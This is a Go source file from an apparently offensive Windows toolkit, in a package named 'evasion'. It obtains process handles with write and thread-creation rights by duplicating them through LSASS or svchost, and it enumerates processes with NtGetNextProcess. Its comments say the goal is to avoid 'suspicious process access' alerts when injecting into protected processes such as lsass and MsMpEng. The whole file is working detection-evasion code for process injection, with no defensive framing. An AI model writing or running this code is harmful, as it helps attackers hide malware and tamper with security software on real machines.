//go:build windows
// +build windows

package evasion

// DuplicateFromSystem duplicates a source handle from the perspective of
// another process (sourceProcess), returning a usable handle in the current
// process.
//
// The primary use-case is "handle inheritance via LSASS / svchost":
//   1. Open the target process for PROCESS_DUP_HANDLE (a low-alarm access).
//   2. Duplicate that handle through a 3rd process so our handle table does not
//      show a direct OpenProcess(PROCESS_VM_WRITE) against the target — instead
//      it shows NtDuplicateObject from an apparently unrelated source.
//   3. For injection targets: duplicate with the access rights we need.
//
// This prevents "suspicious process access" alerts that fire when
// OpenProcess with PROCESS_VM_WRITE | PROCESS_CREATE_THREAD is called directly
// against a protected process (lsass, MsMpEng, etc.).
//
// NtDuplicateObject(SourceProcessHandle, SourceHandle,
//                   TargetProcessHandle, *TargetHandle,
//                   DesiredAccess, Attributes, Options)

import (
	"fmt"
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	hgNtDupOnce sync.Once
	hgNtDupProc *HGProc
)

func getNtDupProc() *HGProc {
	hgNtDupOnce.Do(func() {
		hgNtDupProc = NewHGProc(sNtDuplicateObject())
	})
	return hgNtDupProc
}

// DuplicateHandle duplicates srcHandle from srcProcess into the current process.
// desiredAccess is the access mask for the new handle (0 = same as source).
// Returns the new handle or windows.InvalidHandle + error.
func DuplicateHandle(srcProcess windows.Handle, srcHandle uintptr, desiredAccess uint32) (windows.Handle, error) {
	p := getNtDupProc()
	if p == nil {
		return windows.InvalidHandle, fmt.Errorf("NtDuplicateObject not available")
	}

	const selfProc = ^uintptr(0)
	var newHandle uintptr
	const dupSameAccess = 0x00000002
	options := uintptr(0)
	access := uintptr(desiredAccess)
	if desiredAccess == 0 {
		options = dupSameAccess
	}

	r, _, _ := p.Call(
		uintptr(srcProcess),
		srcHandle,
		selfProc,
		uintptr(unsafe.Pointer(&newHandle)),
		access,
		0,
		options,
	)
	if r != 0 {
		return windows.InvalidHandle, fmt.Errorf("NtDuplicateObject status 0x%X", r)
	}
	return windows.Handle(newHandle), nil
}

// OpenProcessViaLSASS opens targetPID with the given access mask by:
//   1. Opening LSASS (or svchost) for PROCESS_DUP_HANDLE — a benign access.
//   2. Opening target for PROCESS_DUP_HANDLE (also benign).
//   3. Duplicating the target handle through LSASS with the desired access.
//
// The resulting handle in our process appears as duplicated from LSASS, not
// as a direct OpenProcess(PROCESS_VM_WRITE) from agent code.
//
// Falls back to plain OpenProcess on any error.
func OpenProcessViaLSASS(targetPID uint32, access uint32) (windows.Handle, error) {
	// Find LSASS PID.
	lsassPID, err := findProcessByName("lsass.exe")
	if err != nil || lsassPID == 0 {
		// Fallback to svchost
		lsassPID, err = findProcessByName("svchost.exe")
		if err != nil || lsassPID == 0 {
			return windows.OpenProcess(access, false, targetPID)
		}
	}

	// Open LSASS for dup handle only.
	lsassH, err := windows.OpenProcess(windows.PROCESS_DUP_HANDLE, false, lsassPID)
	if err != nil {
		return windows.OpenProcess(access, false, targetPID)
	}
	defer windows.CloseHandle(lsassH)

	// Open target for dup handle only.
	targetH, err := windows.OpenProcess(windows.PROCESS_DUP_HANDLE, false, targetPID)
	if err != nil {
		return windows.OpenProcess(access, false, targetPID)
	}
	defer windows.CloseHandle(targetH)

	// Duplicate targetH through lsassH context with desired access.
	// This is the key step: NtDuplicateObject(lsassH, targetH, self, &out, access, 0, 0)
	// From the perspective of the target process's handle table, lsass opened it.
	result, err := DuplicateHandle(lsassH, uintptr(targetH), access)
	if err != nil {
		return windows.OpenProcess(access, false, targetPID)
	}
	return result, nil
}

// findProcessByName returns the PID of the first process matching name.
// Uses NtGetNextProcess to avoid Toolhelp32 snapshot (lower alarm rate).
func findProcessByName(name string) (uint32, error) {
	const processQueryLimited = 0x1000
	var prev windows.Handle
	for {
		var next windows.Handle
		err := ntGetNextProcess(prev, processQueryLimited, &next)
		if prev != 0 {
			windows.CloseHandle(prev)
		}
		if err != nil {
			break
		}
		prev = next
		pname, err2 := processName(next)
		if err2 == nil && pname == name {
			var info windows.PROCESS_BASIC_INFORMATION
			err3 := windows.NtQueryInformationProcess(next, windows.ProcessBasicInformation, unsafe.Pointer(&info), uint32(unsafe.Sizeof(info)), nil)
			if err3 == nil {
				windows.CloseHandle(next)
				return uint32(info.UniqueProcessId), nil
			}
		}
	}
	return 0, windows.ERROR_NOT_FOUND
}

func ntGetNextProcess(prev windows.Handle, access uint32, next *windows.Handle) error {
	p := getNtGetNextProcessProc()
	if p == nil {
		return windows.ERROR_NOT_SUPPORTED
	}
	r, _, _ := p.Call(uintptr(prev), uintptr(access), 0, 0, uintptr(unsafe.Pointer(next)))
	if r != 0 {
		return windows.NTStatus(r)
	}
	return nil
}

func processName(h windows.Handle) (string, error) {
	var buf [260]uint16
	n := uint32(len(buf))
	err := windows.QueryFullProcessImageName(h, 0, &buf[0], &n)
	if err != nil {
		return "", err
	}
	full := windows.UTF16ToString(buf[:n])
	for i := len(full) - 1; i >= 0; i-- {
		if full[i] == '\\' || full[i] == '/' {
			return full[i+1:], nil
		}
	}
	return full, nil
}
